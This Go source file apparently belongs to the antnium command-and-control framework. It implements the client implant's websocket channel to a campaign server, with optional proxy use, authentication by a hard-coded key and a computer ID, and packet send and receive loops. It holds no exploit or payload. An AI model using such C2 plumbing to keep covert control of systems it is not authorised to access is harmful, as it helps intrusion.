package client

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

type UpstreamWs struct {
	channel    chan model.Packet
	oobChannel chan model.Packet

	// state?
	coder model.Coder

	config   *ClientConfig
	campaign *campaign.Campaign

	wsConn *websocket.Conn
}

func MakeUpstreamWs(config *ClientConfig, campaign *campaign.Campaign) UpstreamWs {
	coder := model.MakeCoder(campaign)

	u := UpstreamWs{
		make(chan model.Packet),
		make(chan model.Packet),
		coder,
		config,
		campaign,
		nil,
	}
	return u
}

func (d *UpstreamWs) Connect() error {
	proxyUrl, ok := getProxy(d.campaign)
	if ok {
		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
			proxyUrlFunc := http.ProxyURL(proxyUrl)
			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
			log.Infof("Using proxy: %s", proxyUrl)
		} else {
			log.Warnf("Could not parse proxy %s: %s", proxyUrl, err.Error())
		}
	}

	return d.connectWs()
}

func (d *UpstreamWs) Connected() bool {
	if d.wsConn == nil {
		return false
	} else {
		return true
	}
}

func (d *UpstreamWs) connectWs() error {
	//u := url.URL{Scheme: "ws", Host: *addr, Path: "/echo"}
	myUrl := strings.Replace(d.campaign.ServerUrl, "http", "ws", 1) + d.campaign.ClientWebsocketPath
	var ws *websocket.Conn
	var err error
	proxyUrl, ok := getProxy(d.campaign)
	if ok {
		parsedUrl, err := url.Parse(proxyUrl)
		if err != nil {
			return fmt.Errorf("Could not parse %s: %s", proxyUrl, err.Error())
		}

		dialer := websocket.Dialer{
			Proxy: http.ProxyURL(parsedUrl),
		}

		ws, _, err = dialer.Dial(myUrl, nil)
		if err != nil {
			return fmt.Errorf("Websocket with proxy %s to %s resulted in %s", proxyUrl, myUrl, err.Error())
		}
	} else {
		ws, _, err = websocket.DefaultDialer.Dial(myUrl, nil)
		if err != nil {
			return fmt.Errorf("Websocket to %s resulted in %s", myUrl, err.Error())
		}
	}

	// Authentication
	authToken := model.ClientWebSocketAuth{
		Key:        "antnium", // d.campaign.ApiKey,
		ComputerId: d.config.ComputerId,
	}
	data, err := json.Marshal(authToken)
	if err != nil {
		return err
	}
	err = ws.WriteMessage(websocket.TextMessage, data)
	if err != nil {
		return err
	}

	log.Info("Connecting to WS succeeded")
	d.wsConn = ws

	return nil
}

func (d *UpstreamWs) Channel() chan model.Packet {
	return d.channel
}

func (d *UpstreamWs) OobChannel() chan model.Packet {
	return d.oobChannel
}

func (d *UpstreamWs) IsConnected() bool {
	if d.wsConn == nil {
		return false
	} else {
		return true
	}
}

// Start is a Thread responsible for receiving packets from server, lifetime:websocket connection
func (d *UpstreamWs) Start() {
	// WS Reader
	go func() {
		defer d.wsConn.Close()
		for {
			// Get packets (blocking)
			_, message, err := d.wsConn.ReadMessage()
			if err != nil {
				log.Errorf("WS read error: %s", err.Error())
				d.wsConn = nil
				break
			}

			packet, err := d.coder.DecodeData(message)
			if err != nil {
				log.Error("Could not decode")
				continue
			}
			log.Info("Received from server via WS")

			d.Channel() <- packet
		}
	}()

	// OOB Reader
	go func() {
		for {
			packet := <-d.OobChannel()

			packetData, err := d.coder.EncodeData(packet)
			if err != nil {
				log.Error("Could not decode")
				return
			}
			log.Info("Send to server via WS")

			d.wsConn.WriteMessage(websocket.TextMessage, packetData)
		}
	}()
}
